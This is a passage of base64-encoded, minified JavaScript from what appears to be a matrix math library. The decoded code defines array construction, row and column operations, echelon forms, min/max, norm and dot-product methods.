ZSsrKWZvcihsZXQgdD0wO3Q8by5jb2x1bW5zO3QrKyluKz1vLmdldChlLHQpO3JldHVybiBufWZ1bmN0aW9uIGZlKG8pe2xldCBuPWd0KG8ucm93cywxKTtmb3IobGV0IGU9MDtlPG8ucm93czsrK2UpZm9yKGxldCB0PTA7dDxvLmNvbHVtbnM7Kyt0KW5bZV0qPW8uZ2V0KGUsdCk7cmV0dXJuIG59ZnVuY3Rpb24gZ2Uobyl7bGV0IG49Z3Qoby5jb2x1bW5zLDEpO2ZvcihsZXQgZT0wO2U8by5yb3dzOysrZSlmb3IobGV0IHQ9MDt0PG8uY29sdW1uczsrK3Qpblt0XSo9by5nZXQoZSx0KTtyZXR1cm4gbn1mdW5jdGlvbiBhZShvKXtsZXQgbj0xO2ZvcihsZXQgZT0wO2U8by5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PG8uY29sdW1uczt0Kyspbio9by5nZXQoZSx0KTtyZXR1cm4gbn1mdW5jdGlvbiBtZShvLG4sZSl7Y29uc3QgdD1vLnJvd3Mscz1vLmNvbHVtbnMscj1bXTtmb3IobGV0IGk9MDtpPHQ7aSsrKXtsZXQgaD0wLGw9MCx1PTA7Zm9yKGxldCBmPTA7ZjxzO2YrKyl1PW8uZ2V0KGksZiktZVtpXSxoKz11LGwrPXUqdTtuP3IucHVzaCgobC1oKmgvcykvKHMtMSkpOnIucHVzaCgobC1oKmgvcykvcyl9cmV0dXJuIHJ9ZnVuY3Rpb24gd2UobyxuLGUpe2NvbnN0IHQ9by5yb3dzLHM9by5jb2x1bW5zLHI9W107Zm9yKGxldCBpPTA7aTxzO2krKyl7bGV0IGg9MCxsPTAsdT0wO2ZvcihsZXQgZj0wO2Y8dDtmKyspdT1vLmdldChmLGkpLWVbaV0saCs9dSxsKz11KnU7bj9yLnB1c2goKGwtaCpoL3QpLyh0LTEpKTpyLnB1c2goKGwtaCpoL3QpL3QpfXJldHVybiByfWZ1bmN0aW9uIHBlKG8sbixlKXtjb25zdCB0PW8ucm93cyxzPW8uY29sdW1ucyxyPXQqcztsZXQgaT0wLGg9MCxsPTA7Zm9yKGxldCB1PTA7dTx0O3UrKylmb3IobGV0IGY9MDtmPHM7ZisrKWw9by5nZXQodSxmKS1lLGkrPWwsaCs9bCpsO3JldHVybiBuPyhoLWkqaS9yKS8oci0xKTooaC1pKmkvcikvcn1mdW5jdGlvbiBkZShvLG4pe2ZvcihsZXQgZT0wO2U8by5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PG8uY29sdW1uczt0Kyspby5zZXQoZSx0LG8uZ2V0KGUsdCktbltlXSl9ZnVuY3Rpb24geWUobyxuKXtmb3IobGV0IGU9MDtlPG8ucm93cztlKyspZm9yKGxldCB0PTA7dDxvLmNvbHVtbnM7dCsrKW8uc2V0KGUsdCxvLmdldChlLHQpLW5bdF0pfWZ1bmN0aW9uIE1lKG8sbil7Zm9yKGxldCBlPTA7ZTxvLnJvd3M7ZSsrKWZvcihsZXQgdD0wO3Q8by5jb2x1bW5zO3QrKylvLnNldChlLHQsby5nZXQoZSx0KS1uKX1mdW5jdGlvbiBFZShvKXtjb25zdCBuPVtdO2ZvcihsZXQgZT0wO2U8by5yb3dzO2UrKyl7bGV0IHQ9MDtmb3IobGV0IHM9MDtzPG8uY29sdW1ucztzKyspdCs9TWF0aC5wb3coby5nZXQoZSxzKSwyKS8oby5jb2x1bW5zLTEpO24ucHVzaChNYXRoLnNxcnQodCkpfXJldHVybiBufWZ1bmN0aW9uIFNlKG8sbil7Zm9yKGxldCBlPTA7ZTxvLnJvd3M7ZSsrKWZvcihsZXQgdD0wO3Q8by5jb2x1bW5zO3QrKylvLnNldChlLHQsby5nZXQoZSx0KS9uW2VdKX1mdW5jdGlvbiBqZShvKXtjb25zdCBuPVtdO2ZvcihsZXQgZT0wO2U8by5jb2x1bW5zO2UrKyl7bGV0IHQ9MDtmb3IobGV0IHM9MDtzPG8ucm93cztzKyspdCs9TWF0aC5wb3coby5nZXQocyxlKSwyKS8oby5yb3dzLTEpO24ucHVzaChNYXRoLnNxcnQodCkpfXJldHVybiBufWZ1bmN0aW9uIGtlKG8sbil7Zm9yKGxldCBlPTA7ZTxvLnJvd3M7ZSsrKWZvcihsZXQgdD0wO3Q8by5jb2x1bW5zO3QrKylvLnNldChlLHQsby5nZXQoZSx0KS9uW3RdKX1mdW5jdGlvbiBiZShvKXtjb25zdCBuPW8uc2l6ZS0xO2xldCBlPTA7Zm9yKGxldCB0PTA7dDxvLmNvbHVtbnM7dCsrKWZvcihsZXQgcz0wO3M8by5yb3dzO3MrKyllKz1NYXRoLnBvdyhvLmdldChzLHQpLDIpL247cmV0dXJuIE1hdGguc3FydChlKX1mdW5jdGlvbiBJZShvLG4pe2ZvcihsZXQgZT0wO2U8by5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PG8uY29sdW1uczt0Kyspby5zZXQoZSx0LG8uZ2V0KGUsdCkvbil9Y2xhc3MgX3tzdGF0aWMgZnJvbTFEQXJyYXkobixlLHQpe2lmKG4qZSE9PXQubGVuZ3RoKXRocm93IG5ldyBSYW5nZUVycm9yKCJkYXRhIGxlbmd0aCBkb2VzIG5vdCBtYXRjaCBnaXZlbiBkaW1lbnNpb25zIik7bGV0IHI9bmV3IGIobixlKTtmb3IobGV0IGk9MDtpPG47aSsrKWZvcihsZXQgaD0wO2g8ZTtoKyspci5zZXQoaSxoLHRbaSplK2hdKTtyZXR1cm4gcn1zdGF0aWMgcm93VmVjdG9yKG4pe2xldCBlPW5ldyBiKDEsbi5sZW5ndGgpO2ZvcihsZXQgdD0wO3Q8bi5sZW5ndGg7dCsrKWUuc2V0KDAsdCxuW3RdKTtyZXR1cm4gZX1zdGF0aWMgY29sdW1uVmVjdG9yKG4pe2xldCBlPW5ldyBiKG4ubGVuZ3RoLDEpO2ZvcihsZXQgdD0wO3Q8bi5sZW5ndGg7dCsrKWUuc2V0KHQsMCxuW3RdKTtyZXR1cm4gZX1zdGF0aWMgemVyb3MobixlKXtyZXR1cm4gbmV3IGIobixlKX1zdGF0aWMgb25lcyhuLGUpe3JldHVybiBuZXcgYihuLGUpLmZpbGwoMSl9c3RhdGljIHJhbmQobixlLHQ9e30pe2lmKHR5cGVvZiB0IT0ib2JqZWN0Iil0aHJvdyBuZXcgVHlwZUVycm9yKCJvcHRpb25zIG11c3QgYmUgYW4gb2JqZWN0Iik7Y29uc3R7cmFuZG9tOnM9TWF0aC5yYW5kb219PXQ7bGV0IHI9bmV3IGIobixlKTtmb3IobGV0IGk9MDtpPG47aSsrKWZvcihsZXQgaD0wO2g8ZTtoKyspci5zZXQoaSxoLHMoKSk7cmV0dXJuIHJ9c3RhdGljIHJhbmRJbnQobixlLHQ9e30pe2lmKHR5cGVvZiB0IT0ib2JqZWN0Iil0aHJvdyBuZXcgVHlwZUVycm9yKCJvcHRpb25zIG11c3QgYmUgYW4gb2JqZWN0Iik7Y29uc3R7bWluOnM9MCxtYXg6cj0xZTMscmFuZG9tOmk9TWF0aC5yYW5kb219PXQ7aWYoIU51bWJlci5pc0ludGVnZXIocykpdGhyb3cgbmV3IFR5cGVFcnJvcigibWluIG11c3QgYmUgYW4gaW50ZWdlciIpO2lmKCFOdW1iZXIuaXNJbnRlZ2VyKHIpKXRocm93IG5ldyBUeXBlRXJyb3IoIm1heCBtdXN0IGJlIGFuIGludGVnZXIiKTtpZihzPj1yKXRocm93IG5ldyBSYW5nZUVycm9yKCJtaW4gbXVzdCBiZSBzbWFsbGVyIHRoYW4gbWF4Iik7bGV0IGg9ci1zLGw9bmV3IGIobixlKTtmb3IobGV0IHU9MDt1PG47dSsrKWZvcihsZXQgZj0wO2Y8ZTtmKyspe2xldCBnPXMrTWF0aC5yb3VuZChpKCkqaCk7bC5zZXQodSxmLGcpfXJldHVybiBsfXN0YXRpYyBleWUobixlLHQpe2U9PT12b2lkIDAmJihlPW4pLHQ9PT12b2lkIDAmJih0PTEpO2xldCBzPU1hdGgubWluKG4sZSkscj10aGlzLnplcm9zKG4sZSk7Zm9yKGxldCBpPTA7aTxzO2krKylyLnNldChpLGksdCk7cmV0dXJuIHJ9c3RhdGljIGRpYWcobixlLHQpe2xldCBzPW4ubGVuZ3RoO2U9PT12b2lkIDAmJihlPXMpLHQ9PT12b2lkIDAmJih0PWUpO2xldCByPU1hdGgubWluKHMsZSx0KSxpPXRoaXMuemVyb3MoZSx0KTtmb3IobGV0IGg9MDtoPHI7aCsrKWkuc2V0KGgsaCxuW2hdKTtyZXR1cm4gaX1zdGF0aWMgbWluKG4sZSl7bj10aGlzLmNoZWNrTWF0cml4KG4pLGU9dGhpcy5jaGVja01hdHJpeChlKTtsZXQgdD1uLnJvd3Mscz1uLmNvbHVtbnMscj1uZXcgYih0LHMpO2ZvcihsZXQgaT0wO2k8dDtpKyspZm9yKGxldCBoPTA7aDxzO2grKylyLnNldChpLGgsTWF0aC5taW4obi5nZXQoaSxoKSxlLmdldChpLGgpKSk7cmV0dXJuIHJ9c3RhdGljIG1heChuLGUpe249dGhpcy5jaGVja01hdHJpeChuKSxlPXRoaXMuY2hlY2tNYXRyaXgoZSk7bGV0IHQ9bi5yb3dzLHM9bi5jb2x1bW5zLHI9bmV3IHRoaXModCxzKTtmb3IobGV0IGk9MDtpPHQ7aSsrKWZvcihsZXQgaD0wO2g8cztoKyspci5zZXQoaSxoLE1hdGgubWF4KG4uZ2V0KGksaCksZS5nZXQoaSxoKSkpO3JldHVybiByfXN0YXRpYyBjaGVja01hdHJpeChuKXtyZXR1cm4gXy5pc01hdHJpeChuKT9uOm5ldyBiKG4pfXN0YXRpYyBpc01hdHJpeChuKXtyZXR1cm4gbiE9bnVsbCYmbi5rbGFzcz09PSJNYXRyaXgifWdldCBzaXplKCl7cmV0dXJuIHRoaXMucm93cyp0aGlzLmNvbHVtbnN9YXBwbHkobil7aWYodHlwZW9mIG4hPSJmdW5jdGlvbiIpdGhyb3cgbmV3IFR5cGVFcnJvcigiY2FsbGJhY2sgbXVzdCBiZSBhIGZ1bmN0aW9uIik7Zm9yKGxldCBlPTA7ZTx0aGlzLnJvd3M7ZSsrKWZvcihsZXQgdD0wO3Q8dGhpcy5jb2x1bW5zO3QrKyluLmNhbGwodGhpcyxlLHQpO3JldHVybiB0aGlzfXRvMURBcnJheSgpe2xldCBuPVtdO2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0Kyspbi5wdXNoKHRoaXMuZ2V0KGUsdCkpO3JldHVybiBufXRvMkRBcnJheSgpe2xldCBuPVtdO2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKyl7bi5wdXNoKFtdKTtmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0KyspbltlXS5wdXNoKHRoaXMuZ2V0KGUsdCkpfXJldHVybiBufXRvSlNPTigpe3JldHVybiB0aGlzLnRvMkRBcnJheSgpfWlzUm93VmVjdG9yKCl7cmV0dXJuIHRoaXMucm93cz09PTF9aXNDb2x1bW5WZWN0b3IoKXtyZXR1cm4gdGhpcy5jb2x1bW5zPT09MX1pc1ZlY3Rvcigpe3JldHVybiB0aGlzLnJvd3M9PT0xfHx0aGlzLmNvbHVtbnM9PT0xfWlzU3F1YXJlKCl7cmV0dXJuIHRoaXMucm93cz09PXRoaXMuY29sdW1uc31pc0VtcHR5KCl7cmV0dXJuIHRoaXMucm93cz09PTB8fHRoaXMuY29sdW1ucz09PTB9aXNTeW1tZXRyaWMoKXtpZih0aGlzLmlzU3F1YXJlKCkpe2ZvcihsZXQgbj0wO248dGhpcy5yb3dzO24rKylmb3IobGV0IGU9MDtlPD1uO2UrKylpZih0aGlzLmdldChuLGUpIT09dGhpcy5nZXQoZSxuKSlyZXR1cm4hMTtyZXR1cm4hMH1yZXR1cm4hMX1pc0VjaGVsb25Gb3JtKCl7bGV0IG49MCxlPTAsdD0tMSxzPSEwLHI9ITE7Zm9yKDtuPHRoaXMucm93cyYmczspe2ZvcihlPTAscj0hMTtlPHRoaXMuY29sdW1ucyYmcj09PSExOyl0aGlzLmdldChuLGUpPT09MD9lKys6dGhpcy5nZXQobixlKT09PTEmJmU+dD8ocj0hMCx0PWUpOihzPSExLHI9ITApO24rK31yZXR1cm4gc31pc1JlZHVjZWRFY2hlbG9uRm9ybSgpe2xldCBuPTAsZT0wLHQ9LTEscz0hMCxyPSExO2Zvcig7bjx0aGlzLnJvd3MmJnM7KXtmb3IoZT0wLHI9ITE7ZTx0aGlzLmNvbHVtbnMmJnI9PT0hMTspdGhpcy5nZXQobixlKT09PTA/ZSsrOnRoaXMuZ2V0KG4sZSk9PT0xJiZlPnQ/KHI9ITAsdD1lKToocz0hMSxyPSEwKTtmb3IobGV0IGk9ZSsxO2k8dGhpcy5yb3dzO2krKyl0aGlzLmdldChuLGkpIT09MCYmKHM9ITEpO24rK31yZXR1cm4gc31lY2hlbG9uRm9ybSgpe2xldCBuPXRoaXMuY2xvbmUoKSxlPTAsdD0wO2Zvcig7ZTxuLnJvd3MmJnQ8bi5jb2x1bW5zOyl7bGV0IHM9ZTtmb3IobGV0IHI9ZTtyPG4ucm93cztyKyspbi5nZXQocix0KT5uLmdldChzLHQpJiYocz1yKTtpZihuLmdldChzLHQpPT09MCl0Kys7ZWxzZXtuLnN3YXBSb3dzKGUscyk7bGV0IHI9bi5nZXQoZSx0KTtmb3IobGV0IGk9dDtpPG4uY29sdW1ucztpKyspbi5zZXQoZSxpLG4uZ2V0KGUsaSkvcik7Zm9yKGxldCBpPWUrMTtpPG4ucm93cztpKyspe2xldCBoPW4uZ2V0KGksdCkvbi5nZXQoZSx0KTtuLnNldChpLHQsMCk7Zm9yKGxldCBsPXQrMTtsPG4uY29sdW1ucztsKyspbi5zZXQoaSxsLG4uZ2V0KGksbCktbi5nZXQoZSxsKSpoKX1lKyssdCsrfX1yZXR1cm4gbn1yZWR1Y2VkRWNoZWxvbkZvcm0oKXtsZXQgbj10aGlzLmVjaGVsb25Gb3JtKCksZT1uLmNvbHVtbnMsdD1uLnJvd3Mscz10LTE7Zm9yKDtzPj0wOylpZihuLm1heFJvdyhzKT09PTApcy0tO2Vsc2V7bGV0IHI9MCxpPSExO2Zvcig7cjx0JiZpPT09ITE7KW4uZ2V0KHMscik9PT0xP2k9ITA6cisrO2ZvcihsZXQgaD0wO2g8cztoKyspe2xldCBsPW4uZ2V0KGgscik7Zm9yKGxldCB1PXI7dTxlO3UrKyl7bGV0IGY9bi5nZXQoaCx1KS1sKm4uZ2V0KHMsdSk7bi5zZXQoaCx1LGYpfX1zLS19cmV0dXJuIG59c2V0KCl7dGhyb3cgbmV3IEVycm9yKCJzZXQgbWV0aG9kIGlzIHVuaW1wbGVtZW50ZWQiKX1nZXQoKXt0aHJvdyBuZXcgRXJyb3IoImdldCBtZXRob2QgaXMgdW5pbXBsZW1lbnRlZCIpfXJlcGVhdChuPXt9KXtpZih0eXBlb2YgbiE9Im9iamVjdCIpdGhyb3cgbmV3IFR5cGVFcnJvcigib3B0aW9ucyBtdXN0IGJlIGFuIG9iamVjdCIpO2NvbnN0e3Jvd3M6ZT0xLGNvbHVtbnM6dD0xfT1uO2lmKCFOdW1iZXIuaXNJbnRlZ2VyKGUpfHxlPD0wKXRocm93IG5ldyBUeXBlRXJyb3IoInJvd3MgbXVzdCBiZSBhIHBvc2l0aXZlIGludGVnZXIiKTtpZighTnVtYmVyLmlzSW50ZWdlcih0KXx8dDw9MCl0aHJvdyBuZXcgVHlwZUVycm9yKCJjb2x1bW5zIG11c3QgYmUgYSBwb3NpdGl2ZSBpbnRlZ2VyIik7bGV0IHM9bmV3IGIodGhpcy5yb3dzKmUsdGhpcy5jb2x1bW5zKnQpO2ZvcihsZXQgcj0wO3I8ZTtyKyspZm9yKGxldCBpPTA7aTx0O2krKylzLnNldFN1Yk1hdHJpeCh0aGlzLHRoaXMucm93cypyLHRoaXMuY29sdW1ucyppKTtyZXR1cm4gc31maWxsKG4pe2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0KyspdGhpcy5zZXQoZSx0LG4pO3JldHVybiB0aGlzfW5lZygpe3JldHVybiB0aGlzLm11bFMoLTEpfWdldFJvdyhuKXtRKHRoaXMsbik7bGV0IGU9W107Zm9yKGxldCB0PTA7dDx0aGlzLmNvbHVtbnM7dCsrKWUucHVzaCh0aGlzLmdldChuLHQpKTtyZXR1cm4gZX1nZXRSb3dWZWN0b3Iobil7cmV0dXJuIGIucm93VmVjdG9yKHRoaXMuZ2V0Um93KG4pKX1zZXRSb3cobixlKXtRKHRoaXMsbiksZT10dCh0aGlzLGUpO2ZvcihsZXQgdD0wO3Q8dGhpcy5jb2x1bW5zO3QrKyl0aGlzLnNldChuLHQsZVt0XSk7cmV0dXJuIHRoaXN9c3dhcFJvd3MobixlKXtRKHRoaXMsbiksUSh0aGlzLGUpO2ZvcihsZXQgdD0wO3Q8dGhpcy5jb2x1bW5zO3QrKyl7bGV0IHM9dGhpcy5nZXQobix0KTt0aGlzLnNldChuLHQsdGhpcy5nZXQoZSx0KSksdGhpcy5zZXQoZSx0LHMpfXJldHVybiB0aGlzfWdldENvbHVtbihuKXtaKHRoaXMsbik7bGV0IGU9W107Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWUucHVzaCh0aGlzLmdldCh0LG4pKTtyZXR1cm4gZX1nZXRDb2x1bW5WZWN0b3Iobil7cmV0dXJuIGIuY29sdW1uVmVjdG9yKHRoaXMuZ2V0Q29sdW1uKG4pKX1zZXRDb2x1bW4obixlKXtaKHRoaXMsbiksZT1ldCh0aGlzLGUpO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKyl0aGlzLnNldCh0LG4sZVt0XSk7cmV0dXJuIHRoaXN9c3dhcENvbHVtbnMobixlKXtaKHRoaXMsbiksWih0aGlzLGUpO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKyl7bGV0IHM9dGhpcy5nZXQodCxuKTt0aGlzLnNldCh0LG4sdGhpcy5nZXQodCxlKSksdGhpcy5zZXQodCxlLHMpfXJldHVybiB0aGlzfWFkZFJvd1ZlY3RvcihuKXtuPXR0KHRoaXMsbik7Zm9yKGxldCBlPTA7ZTx0aGlzLnJvd3M7ZSsrKWZvcihsZXQgdD0wO3Q8dGhpcy5jb2x1bW5zO3QrKyl0aGlzLnNldChlLHQsdGhpcy5nZXQoZSx0KStuW3RdKTtyZXR1cm4gdGhpc31zdWJSb3dWZWN0b3Iobil7bj10dCh0aGlzLG4pO2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0KyspdGhpcy5zZXQoZSx0LHRoaXMuZ2V0KGUsdCktblt0XSk7cmV0dXJuIHRoaXN9bXVsUm93VmVjdG9yKG4pe249dHQodGhpcyxuKTtmb3IobGV0IGU9MDtlPHRoaXMucm93cztlKyspZm9yKGxldCB0PTA7dDx0aGlzLmNvbHVtbnM7dCsrKXRoaXMuc2V0KGUsdCx0aGlzLmdldChlLHQpKm5bdF0pO3JldHVybiB0aGlzfWRpdlJvd1ZlY3RvcihuKXtuPXR0KHRoaXMsbik7Zm9yKGxldCBlPTA7ZTx0aGlzLnJvd3M7ZSsrKWZvcihsZXQgdD0wO3Q8dGhpcy5jb2x1bW5zO3QrKyl0aGlzLnNldChlLHQsdGhpcy5nZXQoZSx0KS9uW3RdKTtyZXR1cm4gdGhpc31hZGRDb2x1bW5WZWN0b3Iobil7bj1ldCh0aGlzLG4pO2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0KyspdGhpcy5zZXQoZSx0LHRoaXMuZ2V0KGUsdCkrbltlXSk7cmV0dXJuIHRoaXN9c3ViQ29sdW1uVmVjdG9yKG4pe249ZXQodGhpcyxuKTtmb3IobGV0IGU9MDtlPHRoaXMucm93cztlKyspZm9yKGxldCB0PTA7dDx0aGlzLmNvbHVtbnM7dCsrKXRoaXMuc2V0KGUsdCx0aGlzLmdldChlLHQpLW5bZV0pO3JldHVybiB0aGlzfW11bENvbHVtblZlY3RvcihuKXtuPWV0KHRoaXMsbik7Zm9yKGxldCBlPTA7ZTx0aGlzLnJvd3M7ZSsrKWZvcihsZXQgdD0wO3Q8dGhpcy5jb2x1bW5zO3QrKyl0aGlzLnNldChlLHQsdGhpcy5nZXQoZSx0KSpuW2VdKTtyZXR1cm4gdGhpc31kaXZDb2x1bW5WZWN0b3Iobil7bj1ldCh0aGlzLG4pO2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0KyspdGhpcy5zZXQoZSx0LHRoaXMuZ2V0KGUsdCkvbltlXSk7cmV0dXJuIHRoaXN9bXVsUm93KG4sZSl7USh0aGlzLG4pO2ZvcihsZXQgdD0wO3Q8dGhpcy5jb2x1bW5zO3QrKyl0aGlzLnNldChuLHQsdGhpcy5nZXQobix0KSplKTtyZXR1cm4gdGhpc31tdWxDb2x1bW4obixlKXtaKHRoaXMsbik7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKXRoaXMuc2V0KHQsbix0aGlzLmdldCh0LG4pKmUpO3JldHVybiB0aGlzfW1heChuKXtpZih0aGlzLmlzRW1wdHkoKSlyZXR1cm4gTmFOO3N3aXRjaChuKXtjYXNlInJvdyI6e2NvbnN0IGU9bmV3IEFycmF5KHRoaXMucm93cykuZmlsbChOdW1iZXIuTkVHQVRJVkVfSU5GSU5JVFkpO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5nZXQodCxzKT5lW3RdJiYoZVt0XT10aGlzLmdldCh0LHMpKTtyZXR1cm4gZX1jYXNlImNvbHVtbiI6e2NvbnN0IGU9bmV3IEFycmF5KHRoaXMuY29sdW1ucykuZmlsbChOdW1iZXIuTkVHQVRJVkVfSU5GSU5JVFkpO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5nZXQodCxzKT5lW3NdJiYoZVtzXT10aGlzLmdldCh0LHMpKTtyZXR1cm4gZX1jYXNlIHZvaWQgMDp7bGV0IGU9dGhpcy5nZXQoMCwwKTtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuZ2V0KHQscyk+ZSYmKGU9dGhpcy5nZXQodCxzKSk7cmV0dXJuIGV9ZGVmYXVsdDp0aHJvdyBuZXcgRXJyb3IoYGludmFsaWQgb3B0aW9uOiAke259YCl9fW1heEluZGV4KCl7bnQodGhpcyk7bGV0IG49dGhpcy5nZXQoMCwwKSxlPVswLDBdO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5nZXQodCxzKT5uJiYobj10aGlzLmdldCh0LHMpLGVbMF09dCxlWzFdPXMpO3JldHVybiBlfW1pbihuKXtpZih0aGlzLmlzRW1wdHkoKSlyZXR1cm4gTmFOO3N3aXRjaChuKXtjYXNlInJvdyI6e2NvbnN0IGU9bmV3IEFycmF5KHRoaXMucm93cykuZmlsbChOdW1iZXIuUE9TSVRJVkVfSU5GSU5JVFkpO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5nZXQodCxzKTxlW3RdJiYoZVt0XT10aGlzLmdldCh0LHMpKTtyZXR1cm4gZX1jYXNlImNvbHVtbiI6e2NvbnN0IGU9bmV3IEFycmF5KHRoaXMuY29sdW1ucykuZmlsbChOdW1iZXIuUE9TSVRJVkVfSU5GSU5JVFkpO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5nZXQodCxzKTxlW3NdJiYoZVtzXT10aGlzLmdldCh0LHMpKTtyZXR1cm4gZX1jYXNlIHZvaWQgMDp7bGV0IGU9dGhpcy5nZXQoMCwwKTtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuZ2V0KHQscyk8ZSYmKGU9dGhpcy5nZXQodCxzKSk7cmV0dXJuIGV9ZGVmYXVsdDp0aHJvdyBuZXcgRXJyb3IoYGludmFsaWQgb3B0aW9uOiAke259YCl9fW1pbkluZGV4KCl7bnQodGhpcyk7bGV0IG49dGhpcy5nZXQoMCwwKSxlPVswLDBdO2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5nZXQodCxzKTxuJiYobj10aGlzLmdldCh0LHMpLGVbMF09dCxlWzFdPXMpO3JldHVybiBlfW1heFJvdyhuKXtpZihRKHRoaXMsbiksdGhpcy5pc0VtcHR5KCkpcmV0dXJuIE5hTjtsZXQgZT10aGlzLmdldChuLDApO2ZvcihsZXQgdD0xO3Q8dGhpcy5jb2x1bW5zO3QrKyl0aGlzLmdldChuLHQpPmUmJihlPXRoaXMuZ2V0KG4sdCkpO3JldHVybiBlfW1heFJvd0luZGV4KG4pe1EodGhpcyxuKSxudCh0aGlzKTtsZXQgZT10aGlzLmdldChuLDApLHQ9W24sMF07Zm9yKGxldCBzPTE7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuZ2V0KG4scyk+ZSYmKGU9dGhpcy5nZXQobixzKSx0WzFdPXMpO3JldHVybiB0fW1pblJvdyhuKXtpZihRKHRoaXMsbiksdGhpcy5pc0VtcHR5KCkpcmV0dXJuIE5hTjtsZXQgZT10aGlzLmdldChuLDApO2ZvcihsZXQgdD0xO3Q8dGhpcy5jb2x1bW5zO3QrKyl0aGlzLmdldChuLHQpPGUmJihlPXRoaXMuZ2V0KG4sdCkpO3JldHVybiBlfW1pblJvd0luZGV4KG4pe1EodGhpcyxuKSxudCh0aGlzKTtsZXQgZT10aGlzLmdldChuLDApLHQ9W24sMF07Zm9yKGxldCBzPTE7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuZ2V0KG4scyk8ZSYmKGU9dGhpcy5nZXQobixzKSx0WzFdPXMpO3JldHVybiB0fW1heENvbHVtbihuKXtpZihaKHRoaXMsbiksdGhpcy5pc0VtcHR5KCkpcmV0dXJuIE5hTjtsZXQgZT10aGlzLmdldCgwLG4pO2ZvcihsZXQgdD0xO3Q8dGhpcy5yb3dzO3QrKyl0aGlzLmdldCh0LG4pPmUmJihlPXRoaXMuZ2V0KHQsbikpO3JldHVybiBlfW1heENvbHVtbkluZGV4KG4pe1oodGhpcyxuKSxudCh0aGlzKTtsZXQgZT10aGlzLmdldCgwLG4pLHQ9WzAsbl07Zm9yKGxldCBzPTE7czx0aGlzLnJvd3M7cysrKXRoaXMuZ2V0KHMsbik+ZSYmKGU9dGhpcy5nZXQocyxuKSx0WzBdPXMpO3JldHVybiB0fW1pbkNvbHVtbihuKXtpZihaKHRoaXMsbiksdGhpcy5pc0VtcHR5KCkpcmV0dXJuIE5hTjtsZXQgZT10aGlzLmdldCgwLG4pO2ZvcihsZXQgdD0xO3Q8dGhpcy5yb3dzO3QrKyl0aGlzLmdldCh0LG4pPGUmJihlPXRoaXMuZ2V0KHQsbikpO3JldHVybiBlfW1pbkNvbHVtbkluZGV4KG4pe1oodGhpcyxuKSxudCh0aGlzKTtsZXQgZT10aGlzLmdldCgwLG4pLHQ9WzAsbl07Zm9yKGxldCBzPTE7czx0aGlzLnJvd3M7cysrKXRoaXMuZ2V0KHMsbik8ZSYmKGU9dGhpcy5nZXQocyxuKSx0WzBdPXMpO3JldHVybiB0fWRpYWcoKXtsZXQgbj1NYXRoLm1pbih0aGlzLnJvd3MsdGhpcy5jb2x1bW5zKSxlPVtdO2ZvcihsZXQgdD0wO3Q8bjt0KyspZS5wdXNoKHRoaXMuZ2V0KHQsdCkpO3JldHVybiBlfW5vcm0obj0iZnJvYmVuaXVzIil7bGV0IGU9MDtpZihuPT09Im1heCIpcmV0dXJuIHRoaXMubWF4KCk7aWYobj09PSJmcm9iZW5pdXMiKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKWU9ZSt0aGlzLmdldCh0LHMpKnRoaXMuZ2V0KHQscyk7cmV0dXJuIE1hdGguc3FydChlKX1lbHNlIHRocm93IG5ldyBSYW5nZUVycm9yKGB1bmtub3duIG5vcm0gdHlwZTogJHtufWApfWN1bXVsYXRpdmVTdW0oKXtsZXQgbj0wO2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0Kyspbis9dGhpcy5nZXQoZSx0KSx0aGlzLnNldChlLHQsbik7cmV0dXJuIHRoaXN9ZG90KG4pe18uaXNNYXRyaXgobikmJihuPW4udG8xREFycmF5KCkpO2xldCBlPXRoaXMudG8xREFycmF5KCk7aWYoZS5sZW5ndGghPT1uLmxlbmd0aCl0aHJvdyBuZXcgUmFuZ2VFcnJvcigidmVjdG9ycyBkbyBub3QgaGF2ZSB0aGUgc2FtZSBzaXplIik7bGV0IHQ9MDtmb3IobGV0IHM9MDtzP